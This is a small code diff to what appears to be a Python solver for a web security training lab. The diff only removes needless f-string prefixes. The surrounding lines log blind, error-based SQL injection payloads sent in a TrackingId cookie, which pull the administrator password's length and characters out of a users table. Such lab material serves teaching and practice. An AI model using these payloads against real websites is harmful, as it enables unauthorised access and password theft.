@@ -4,7 +4,7 @@ import string
 
 def solve_lab(session):
     logger.info(
-        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
+        'Determining the length of the administrator password by visiting "/" with the following cookies:'
     )
     logger.info(
         '{"TrackingId": "\' UNION SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
@@ -26,7 +26,7 @@ def solve_lab(session):
                 break
 
     logger.info(
-        f'Determining administrator password by visiting "/" with the following cookies:'
+        'Determining administrator password by visiting "/" with the following cookies:'
     )
     logger.info(
         '{"TrackingId": "\' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN TO_CHAR(1/0) ELSE NULL END FROM dual --"}'
